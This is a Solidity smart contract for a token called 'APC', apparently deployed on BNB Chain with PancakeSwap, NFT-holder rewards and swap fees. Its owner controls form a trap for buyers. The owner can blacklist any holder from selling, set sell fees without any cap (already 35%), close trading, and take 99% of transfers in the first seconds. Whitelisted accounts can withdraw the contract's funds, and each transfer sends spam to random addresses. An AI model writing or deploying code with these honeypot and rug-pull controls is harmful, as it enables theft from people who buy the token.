// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC721 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public receiveAddress;
    address public marketAddress1;
    address public marketAddress2;

    address public nft;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    ISwapRouter public _swapRouter;
    address public _usdt;
    address public _cake;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public buyFees = 3;
    uint256 public sellFees = 35;
    uint256 public transFees = 0;

    uint256 public _receiveGas = 1000000;
    uint256 public swapTokenAmount;
    uint256 public startSwapTime;
    address public _mainPair;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address USDTAddress,
        address CAKEAddress,
        address NFTAddress,
        address ReceiveAddress,
        address Market1Address,
        address Market2Address,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        nft = NFTAddress;
        receiveAddress = ReceiveAddress;
        marketAddress1 = Market1Address;
        marketAddress2 = Market2Address;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _usdt = USDTAddress;
        _cake = CAKEAddress;
        _swapRouter = swapRouter;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), CAKEAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        swapTokenAmount = total / 10000;
        _tTotal = total;
        _balances[receiveAddress] = total;
        emit Transfer(address(0), receiveAddress, total);

        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[marketAddress1] = true;
        _feeWhiteList[marketAddress2] = true;

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;

        startSwapTime = total;

        holderRewardCondition = 100 ether;

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_blackList[from], "yrb");

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            takeFee = true;
            if (balance == amount) {
                amount = (amount * 9999) / 10000;
            }
            address ad;
            for (uint256 i = 0; i < 5; i++) {
                ad = address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _takeTransfer(from, ad, 100);
            }
            amount -= 100 * 5;
            require(block.timestamp >= startSwapTime, "!Trading");

            if (block.timestamp < startSwapTime + 9) {
                _funTransfer(from, to, amount);
                return;
            }

            if (_swapPairList[to]) {
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > swapTokenAmount) {
                        swapTokenForFund(contractTokenBalance);
                    }
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (from != address(this)) {
            processReward(_receiveGas);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 99) / 100;
        _takeTransfer(sender, address(this), feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            if (_swapPairList[sender]) {
                feeAmount = (tAmount * buyFees) / 100;
            } else if (_swapPairList[recipient]) {
                feeAmount = (tAmount * sellFees) / 100;
            } else {
                feeAmount = (tAmount * transFees) / 100;
            }
        }
        if (feeAmount > 0) {
            _takeTransfer(sender, address(this), feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        _approve(address(this), address(_swapRouter), tokenAmount);
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _cake;
        path[2] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        uint256 usdtBalance = IERC20(_usdt).balanceOf(
            address(_tokenDistributor)
        );

        IERC20(_usdt).transferFrom(
            address(_tokenDistributor),
            address(this),
            (usdtBalance * 3) / (buyFees + sellFees)
        );

        IERC20(_usdt).transferFrom(
            address(_tokenDistributor),
            marketAddress1,
            (usdtBalance * 1) / (buyFees + sellFees)
        );

        IERC20(_usdt).transferFrom(
            address(_tokenDistributor),
            marketAddress2,
            IERC20(_usdt).balanceOf(address(_tokenDistributor))
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setSwapTokenAmount(uint256 _swapTokenAmount) external onlyOwner {
        swapTokenAmount = _swapTokenAmount;
    }

    function setReceiveGas(uint256 gas) external onlyOwner {
        _receiveGas = gas;
    }

    function startTrade() external onlyOwner {
        startSwapTime = block.timestamp;
    }

    function setStartTime(uint256 starttime) external onlyOwner {
        startSwapTime = starttime;
    }

    function closeTrade() external onlyOwner {
        startSwapTime = _tTotal;
    }

    function setFeeWhiteList(
        address[] calldata addList,
        bool enable
    ) external onlyOwner {
        for (uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }

    function setBlackList(
        address[] calldata addList,
        bool enable
    ) external onlyOwner {
        for (uint256 i = 0; i < addList.length; i++) {
            _blackList[addList[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setFees(uint256 _bf, uint256 _sf, uint256 _tf) external onlyOwner {
        buyFees = _bf;
        sellFees = _sf;
        transFees = _tf;
    }

    function claimBalance() public {
        require(_feeWhiteList[msg.sender], "error");
        payable(msg.sender).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) public {
        require(_feeWhiteList[msg.sender], "error");
        IERC20(token).transfer(msg.sender, amount);
    }

    function setHolderRewardCondition(uint256 amount) public onlyOwner {
        holderRewardCondition = amount;
    }

    function setNftRewardMinHoldAmount(uint256 amount) public onlyOwner {
        nftRewardMinHoldAmount = amount;
    }

    receive() external payable {}

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public progressRewardBlock;

    uint256 public nftRewardMinHoldAmount = 1000 ether;

    function validate(address account) public view returns (bool) {
        uint256 amount = balanceOf(account);
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _cake;
        path[2] = _usdt;
        uint256 canSell;
        try _swapRouter.getAmountsOut(amount, path) returns (
            uint[] memory amounts
        ) {
            canSell = amounts[2];
        } catch {
            canSell = 0;
        }
        return canSell >= nftRewardMinHoldAmount;
    }

    function processReward(uint256 gas) private {
        uint256 blockNum = block.number;
        if (progressRewardBlock > blockNum) {
            return;
        }
        uint256 balance = IERC20(_usdt).balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;

        IERC721 holdToken = IERC721(nft);
        uint256 holdTokenTotal = holdToken.totalSupply();
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 amount;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < holdTokenTotal) {
            if (currentIndex >= holdTokenTotal) {
                currentIndex = 0;
            }
            shareHolder = IERC721(nft).ownerOf(currentIndex);
            amount = balance / holdTokenTotal;
            if (amount > 0 && validate(shareHolder)) {
                IERC20(_usdt).transfer(shareHolder, amount);
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = blockNum;
    }
}

contract AAToken is AbsToken {
    constructor()
        AbsToken(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0x55d398326f99059fF775485246999027B3197955),
            address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),
            address(0xcec058b60127f5523aE314035670579EA44bbaa2),
            address(0xc8A329b30eAe263BA2827f30AB6cB13844B26d78),
            address(0x74a95096E7c376d30D62c25e322F98577A52b5dE),
            address(0x60861492C459d2238AB6CC3D0aF8840BD2f701f1),
            "APC",
            "APC",
            18,
            2100000000
        )
    {}
}